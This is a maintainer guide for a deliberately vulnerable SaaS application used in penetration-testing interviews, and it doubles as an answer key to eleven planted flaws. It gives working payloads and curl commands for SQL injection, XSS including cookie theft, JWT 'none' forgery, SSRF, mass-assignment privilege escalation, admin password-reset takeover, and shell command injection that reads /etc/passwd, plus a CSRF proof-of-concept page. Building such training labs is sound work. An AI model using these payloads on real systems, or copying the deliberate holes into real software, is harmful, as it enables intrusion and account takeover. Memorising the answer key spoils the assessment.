# Vulnerable SaaS Application - Maintainer Guide

## Overview
This application is designed for a penetration testing interview. It contains multiple vulnerabilities that candidates are expected to find.

## Running the Application
### Backend
1. `cd backend`
2. `python3 -m pip install -r requirements.txt`
3. `cd ..` (Go back to project root)
4. `python3 -m backend.seed` (Reset/Seed Database)
5. `uvicorn backend.main:app --reload --port 8000`

### Frontend
1. `cd frontend`
2. `npm install`
3. `npm run dev`

## Vulnerabilities & Solutions

| ID | Vulnerability | Endpoint | Method | Difficulty | Points |
|----|--------------|----------|--------|------------|--------|
| `sqli-login` | SQL Injection (Login) | `/api/auth/token` | POST | Easy | 100 |
| `idor-invoice` | IDOR (Invoices) | `/api/invoices/{id}` | GET | Easy | 100 |
| `stored-xss-note` | Stored XSS | `/api/notes/` | POST | Medium | 150 |
| `broken-auth-jwt` | JWT 'none' Algorithm | `/api/admin/users` | GET | Medium | 200 |
| `ssrf-avatar` | SSRF | `/api/misc/fetch-avatar` | POST | Hard | 250 |
| `dom-xss-search` | DOM-Based XSS (Search) | `/api/misc/search` | GET | Hard | 300 |
| `mass-assignment-role` | Mass Assignment (Priv-Esc) | `/api/auth/me` | PUT | Medium | 200 |
| `pwd-reset-token-leak` | Password Reset Token Leak | `/api/auth/forgot-password` | POST | Medium | 200 |
| `cmd-injection-ping` | Command Injection (Ping) | `/api/misc/ping` | POST | Hard | 300 |
| `open-redirect-login` | Open Redirect (Post-Login) | `/api/auth/redirect` | GET | Easy | 125 |
| `csrf-display-name` | CSRF (Display Name Update) | `/api/account/update-display-name` | POST | Hard | 250 |

### 1. SQL Injection (Login Bypass)
- **Endpoint:** `POST /api/auth/token`
- **Parameter:** `username`
- **Exploit:** `' OR '1'='1` or `admin' --` (if you know the username) or `admin' UNION SELECT ...`
- **Detection:** The backend checks if the query returns a result that has a password hash matching the input, OR if the user manages to inject a fake user row via UNION.
- **Goal:** Log in as `admin` without knowing the password.
- **Payload Example:** Username: `admin' --`, Password: `any` (might fail if password check is strict). 
- **Better Payload:** `admin' UNION SELECT 1, 'admin', 'known_hash', 'admin', 1, 'key' --` (Requires guessing columns).
- **Simplest Path:** The code allows bypass if the injected row has a matching hash. The current implementation is a bit complex, but essentially if you can inject a row, you can login.

### 2. IDOR (Invoices)
- **Endpoint:** `GET /api/invoices/{id}`
- **Exploit:** Change the `id` in the URL to an ID belonging to another tenant (e.g., `2`).
- **Detection:** Backend checks if the requested invoice tenant_id != current user tenant_id.
- **Goal:** View invoice #2 (Tenant B's invoice) while logged in as User A.

### 3. Stored XSS (Notes)
- **Endpoint:** `POST /api/notes/`
- **Exploit:** Submit a note with `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`.
- **Detection:** Backend regex matches common XSS patterns in the content upon submission.
- **Goal:** Store a malicious script.

### 4. JWT 'none' Algorithm
- **Endpoint:** `GET /api/admin/users` (or any admin protected endpoint)
- **Exploit:**
  1. Capture a valid token.
  2. Decode the header and change `"alg": "HS256"` to `"alg": "none"`.
  3. Remove the signature part (leave the trailing dot).
  4. Change payload `"role": "user"` to `"role": "admin"`.
  5. Send request with modified token.
- **Detection:** Backend explicitly checks if `alg` is `none` and if so awards points.
- **Goal:** Access the admin-only user list.

### 5. SSRF (Avatar Fetch)
- **Endpoint:** `POST /api/misc/fetch-avatar`
- **Exploit:** Provide a URL pointing to `http://localhost:8000/api/admin/internal-config` or `http://127.0.0.1:8000...`.
- **Detection:** Backend checks if the URL targets localhost/127.0.0.1 and specifically the internal config path.
- **Goal:** Read the internal configuration secret.

### 6. DOM-Based XSS (Notes Search) 🆕
- **Endpoint:** `GET /api/misc/search?q=<payload>`
- **Difficulty:** Hard | **Points:** 300
- **OWASP Category:** A03 - Injection (XSS)
- **Where:** Notes page search bar and the `?q=` URL query parameter.
- **How it works:**
  1. The frontend reads the `?q=` parameter from the URL on page load.
  2. It calls `GET /api/misc/search?q=<value>` to fetch results.
  3. The API reflects `q` back verbatim in the `search_term` field.
  4. The frontend renders `search_term` with `dangerouslySetInnerHTML` (the XSS sink).
- **Blacklist (intentionally incomplete):** The backend strips `<script>` tags from the returned `search_term` using a regex. Standard `<script>alert(1)</script>` payloads will NOT work — candidates must use an alternative XSS vector such as:
  - `<img src=x onerror=alert(1)>` ✅
  - `<svg onload=alert(1)>` ✅
  - `<details open ontoggle=alert(1)>` ✅
  - `<script>alert(1)</script>` ❌ blocked
- **Exploit (Steps to Reproduce):**
  1. Log in as any user.
  2. Navigate to the Notes page with a crafted URL (note: must avoid script tags):
     ```
     http://localhost:3000/dashboard/notes?q=<img src=x onerror=alert(document.cookie)>
     ```
  3. The page loads, calls the search API, and injects the `onerror` payload into the DOM.
  4. An `alert` box (or cookie theft) executes in the browser.
- **Detection trigger:** Backend regex matches XSS patterns in `q`; points awarded on the search API call.
- **Why it's Hard:** (1) The XSS vector is in the URL parameter, not a form field. (2) The `<script>` blacklist forces candidates to know alternative XSS payloads, separating intermediate from advanced testers. (3) The social-engineering angle (phishing a victim with the URL) is the real-world attack scenario.

### 7. Mass Assignment — Privilege Escalation (Profile Update) 🆕
- **Endpoint:** `PUT /api/auth/me`
- **Difficulty:** Medium | **Points:** 200
- **OWASP Category:** A08 - Software and Data Integrity Failures / A01 - Broken Access Control
- **Where:** Profile Settings → Account Settings section.
- **How it works:**
  - The frontend `PUT /api/auth/me` sends `{ "username": "<new name>" }` to update the account.
  - The backend naively iterates all JSON keys and calls `setattr(user, field, value)` for any attribute the model has.
  - **Any** field on the `User` model can be overwritten, including `role` and `tenant_id`.
- **Exploit (Steps to Reproduce):**
  1. Log in as a regular user (e.g., `user1`/`password123`).
  2. Open browser DevTools → Network tab, or use a proxy (Burp/mitmproxy).
  3. Intercept the `PUT /api/auth/me` request from the "Save Changes" button.
  4. Modify the JSON body from `{"username": "whatever"}` to:
     ```json
     {"username": "whatever", "role": "admin"}
     ```
  5. Forward the modified request.
  6. The backend sets `user.role = "admin"` and the response confirms it:
     ```json
     {"message": "Profile updated successfully.", "role": "admin", ...}
     ```
  7. Subsequent requests (e.g., `GET /api/admin/users`) are now authorized.
- **Alternative — curl:**
  ```bash
  TOKEN=<your_jwt>
  curl -X PUT http://localhost:8000/api/auth/me \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"username": "haxor", "role": "admin"}'
  ```
- **Detection trigger:** Backend checks `if "role" in updates` and awards points.
- **Why it's Medium:** The UI gives no indication that `role` is a settable field — the tester must inspect the API or read the response body carefully. It requires either a proxy or DevTools knowledge, separating intermediate testers from beginners.

### 8. Password Reset Token Exposure 🆕
- **Endpoint:** `POST /api/auth/forgot-password` then `POST /api/auth/reset-password`
- **Difficulty:** Medium | **Points:** 200
- **OWASP Category:** A02 - Cryptographic Failures / A05 - Security Misconfiguration
- **Where:** Forgot Password page (`/forgot-password`).
- **How it works:**
  - `POST /api/auth/forgot-password` accepts a `{"username": "..."}` body.
  - Instead of emailing the reset token, the API returns it **directly in the JSON response** inside a `dev_note` field.
  - The token is also cryptographically weak: `MD5(username)` — predictable offline without any API call.
- **Two distinct attack paths:**
  1. **Token in response (primary):** Call the endpoint for any user, read `dev_note` from the HTTP response, then call `/reset-password` with that token to take over the account.
  2. **Predictable token (advanced):** Generate the token offline: `python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())"`. No API call needed for step 1.
- **Exploit — Path 1 (Token Leak):**
  ```bash
  # Step 1: Get the admin reset token from the response
  curl -s -X POST http://localhost:8000/api/auth/forgot-password \
    -H 'Content-Type: application/json' \
    -d '{"username": "admin"}'
  # Response: {"message": "...", "dev_note": "[DEV MODE] Token delivery bypassed. Token: <TOKEN>"}

  # Step 2: Reset the admin password
  curl -s -X POST http://localhost:8000/api/auth/reset-password \
    -H 'Content-Type: application/json' \
    -d '{"username": "admin", "token": "<TOKEN>", "new_password": "hacked"}'
  ```
- **Exploit — Path 2 (Predictable Token):**
  ```bash
  TOKEN=$(python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())")
  curl -s -X POST http://localhost:8000/api/auth/reset-password \
    -H 'Content-Type: application/json' \
    -d "{\"username\": \"admin\", \"token\": \"$TOKEN\", \"new_password\": \"hacked\"}"
  ```
- **Detection trigger:** Points awarded when `/reset-password` is called successfully with `username == "admin"`.
- **Why it's Medium:** Requires inspecting raw HTTP responses (not just rendered UI) and understanding that a `dev_note` field containing a security token is critically dangerous.

### 9. Command Injection (Network Ping) 🆕
- **Endpoint:** `POST /api/misc/ping`
- **Difficulty:** Hard | **Points:** 300
- **OWASP Category:** A03 - Injection (OS Command Injection)
- **Where:** Dashboard → Network Tools page.
- **How it works:**
  - The ping endpoint takes `{"host": "..."}` and executes `ping -c 2 {host}` via `subprocess.run(..., shell=True)` without any sanitisation.
  - Any shell metacharacter in `host` allows arbitrary OS command execution on the server.
- **Exploit (Steps to Reproduce):**
  1. Log in as any user and navigate to **Network Tools**.
  2. Enter any of the following payloads in the hostname field:
     ```
     127.0.0.1; whoami
     127.0.0.1 && id
     127.0.0.1 | cat /etc/passwd
     127.0.0.1; ls -la /
     `id`
     $(cat /etc/passwd)
     ```
  3. Click **Ping** and observe the server's response — command output appears in the terminal-style output box alongside the ping results.
- **Alternative — curl:**
  ```bash
  TOKEN=<your_jwt>
  curl -X POST http://localhost:8000/api/misc/ping \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"host": "127.0.0.1; id"}'
  ```
- **Detection trigger:** Backend checks for shell metacharacters (`;`, `&&`, `|`, backtick, `$(`, etc.) in the `host` field before executing.
- **Why it's Hard:** The UI looks like a simple connectivity test. Candidates must (1) identify that a server-side process is being executed, (2) know shell injection metacharacters, and (3) connect the input to the OS-level execution. Many testers will test for SQLi / XSS first and overlook this feature.

### 10. Open Redirect (Post-Login) 🆕
- **Endpoint:** `GET /api/auth/redirect?next=<url>`
- **Difficulty:** Easy | **Points:** 125
- **OWASP Category:** A01 - Broken Access Control
- **Where:** Login page (`/login?next=<url>`).
- **How it works:**
  - After a successful login the frontend calls `GET /api/auth/redirect?next=<nextUrl>` (via `api.fetch()`) where `nextUrl` is taken directly from the `?next=` query parameter of the login page URL.
  - The backend returns `{"redirect_to": nextUrl}` without any validation.
  - The frontend then does `window.location.href = data.redirect_to`, which navigates the browser to whatever URL the backend returned.
- **Exploit (Steps to Reproduce):**
  1. Craft a login URL with an external `next` parameter:
     ```
     http://localhost:3000/login?next=https://example.com
     ```
  2. Share this link with a victim (phishing email, QR code, etc.).
  3. The victim enters their credentials on the legitimate login page.
  4. After login, the frontend calls `/api/auth/redirect?next=https://example.com` and is silently redirected to the attacker-controlled site.
- **Alternative — direct API call to verify the endpoint:**
  ```bash
  curl -s 'http://localhost:8000/api/auth/redirect?next=https://example.com'
  # Response: {"redirect_to": "https://example.com"}
  # Points awarded if candidate_id is provided via X-Candidate-ID header
  ```
- **Detection trigger:** Backend checks if `next` starts with `http://` or `https://` and does NOT contain `localhost` or `127.0.0.1`.
- **Why it's Easy:** The vulnerability is straightforward once spotted — any tester who inspects the post-login network traffic in DevTools will see `?next=` being echoed back in the response. Points reflect the low technical bar; the real-world impact (phishing, credential harvesting) is what makes it impactful.

### 11. CSRF — Display Name Update 🆕
- **Endpoint:** `POST /api/account/update-display-name`
- **PoC Attacker Page:** `http://localhost:8000/poc/csrf?candidate_id=<session_id>`
- **Difficulty:** Hard | **Points:** 250
- **OWASP Category:** A01 - Broken Access Control (CSRF is listed under A01 in OWASP Top 10 2021)

#### Why this endpoint is vulnerable
The display name update endpoint authenticates users via the `token` **cookie** that `js-cookie` sets at login. It does **not** require the `Authorization: Bearer` header that `api.fetch()` normally attaches. Because the cookie has no `SameSite=Strict` attribute, the browser sends it automatically on cross-origin POST requests that share the same *site* — which in this lab is anything on `localhost` regardless of port.

Three conditions that must all be true for a CSRF attack to succeed — **all three are present here**:

| Condition | Status | Detail |
|-----------|--------|--------|
| State-changing action | ✅ | Changes the user's display name |
| Cookie-based auth | ✅ | Reads `Cookie: token=<jwt>` — no custom header needed |
| No CSRF token | ✅ | No `X-CSRF-Token`, no `Origin`/`Referer` check |

#### How it actually works on localhost
In modern browsers (Chrome 80+), cookies without an explicit `SameSite` attribute are treated as `SameSite=Lax`. Under `Lax`:
- Cross-site **GET** navigations: cookie **is** sent
- Cross-site **POST** form submissions: cookie **is NOT** sent… **unless** the request is "same-site".

`localhost:3000` and `localhost:8000` share the same *site* (`localhost`) — ports are ignored for SameSite purposes. So a form on `:8000` posting to `:3000` IS same-site, and the `token` cookie IS sent. The attack executes in an unmodified Chrome.

#### Steps to Reproduce (full exploit walkthrough)

**Step 1 — Understand the target**
1. Log in to the app at `http://localhost:3000`.
2. Open **Profile → Display Name** and update it to anything. Capture the request in DevTools/Burp.
3. Observe the request goes to `POST /api/account/update-display-name`.
4. Notice the endpoint accepts `application/x-www-form-urlencoded` and `application/json`.
5. Notice there is **no** `X-CSRF-Token` or similar field required.
6. Notice the `token` cookie is present in the request alongside the `Authorization: Bearer` header.

**Step 2 — Verify cookie-only auth works (no Authorization header needed)**
```bash
# Extract your token cookie value from DevTools → Application → Cookies
TOKEN_COOKIE="<paste token here>"

curl -X POST http://localhost:8000/api/account/update-display-name \
  -H "Cookie: token=$TOKEN_COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "display_name=cookie_auth_works" \
  --data-urlencode "candidate_id=<your_session_id>"

# If this succeeds without an Authorization header — the endpoint is CSRF-vulnerable!
```

**Step 3 — Execute the CSRF attack using the provided PoC page**
1. Make sure you are logged in to the app at `http://localhost:3000`.
2. Navigate to the attacker's page (served from the different-port backend):
   ```
   http://localhost:8000/poc/csrf?candidate_id=<your_session_id>
   ```
3. Click **"🎉 Claim My Prize!"**
4. The form submits to `http://localhost:3000/api/account/update-display-name`.
5. The browser automatically attaches the `token` cookie (same-site).
6. The server authenticates via cookie with no CSRF token check → display name changed to `CSRF_PWNED`.
7. **Points are awarded** and the scoreboard alert fires.
8. Navigate back to `http://localhost:3000/dashboard/profile` — the display name has changed without the user ever knowing.

**Alternative — Write your own PoC**
```html
<!-- evil.html — open from any same-site origin -->
<form action="http://localhost:3000/api/account/update-display-name"
      method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="display_name" value="HACKED" />
  <input type="hidden" name="candidate_id" value="<session_id>" />
  <button>Submit</button>
</form>
```

#### Detection trigger
Points are awarded when **all** of the following are true on a call to `POST /api/account/update-display-name`:
1. No `Authorization` header in the request (cookie-only authentication — hallmark of a form-based CSRF)
2. A `candidate_id` is present in the form data, JSON body, or query string

#### What to look for (indicators of the vulnerability)
| Indicator | Where to find it |
|-----------|------------------|
| Endpoint accepts `application/x-www-form-urlencoded` | DevTools → Network → Request Headers |
| No CSRF token in the form | Page source / DevTools |
| `token` cookie with no `SameSite=Strict` | DevTools → Application → Cookies |
| No `Origin`/`Referer` validation | Read the backend source / test with curl |
| Cookie auth succeeds without `Authorization` header | `curl` test (Step 2 above) |

#### Why it's Hard
1. Candidates must understand the difference between **same-origin** (scheme+host+port) and **same-site** (scheme+host, ports ignored) — a common knowledge gap.
2. They must identify that `js-cookie` stores the JWT as a **cookie** (not just in-memory), making it susceptible to CSRF.
3. They need to know that `SameSite=Lax` still allows same-site cross-origin POST — so the attack works in modern browsers on localhost.
4. Writing a working PoC requires combining cookie mechanics, HTML form submission, and cross-origin behavior — separating advanced testers from intermediate ones.

## Scoring System
- The app automatically awards points when these conditions are met.
- Frontend listens to SSE at `/api/session/events` to show notifications.
- Admin can view scoreboard at `/api/scoreboard/{session_id}` (or implement a page for it).

## Reset
- Run `python3 -m backend.seed` to wipe the DB and re-seed.
- Use the admin "Reset Lab" button (if implemented in UI) or endpoint `/api/admin/reset-lab`.
